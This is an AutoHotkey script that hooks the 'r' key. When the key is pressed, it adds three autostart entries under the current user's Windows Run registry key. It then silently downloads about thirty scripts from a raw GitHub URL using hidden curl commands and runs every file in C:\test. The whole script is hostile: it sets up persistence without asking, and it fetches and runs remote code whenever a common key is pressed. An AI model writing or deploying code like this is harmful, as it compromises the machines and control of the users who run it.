#SingleInstance Force

^Esc::ExitApp

DirList(pattern, attr := "") {
    files := []
    Loop Files pattern, attr {
        files.Push(A_LoopFileFullPath)
    }
    return files
}

$r::{
    path := "C:\test"
    Send "r"
    RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1", '"C:\test\LButton.exe"')
    RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2", '"C:\test\RButton.exe"')
    RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3", '"C:\test\Delete.exe"')
    if (DirExist(path)) {
        for file in DirList(path "\*") {
            MsgBox file
            Run file
        }
    } else {
        DirCreate(path)
        letters := ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "LButton", "RButton", "Delete", "Backspace", "Space"]
        for letter in letters {
            command := "cmd /c curl https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".ahk > " path "\" letter ".ahk"
            RunWait command, , "Hide"
        }
        for file in DirList(path "\*") {
            MsgBox file
            Run file
        }
    }
}
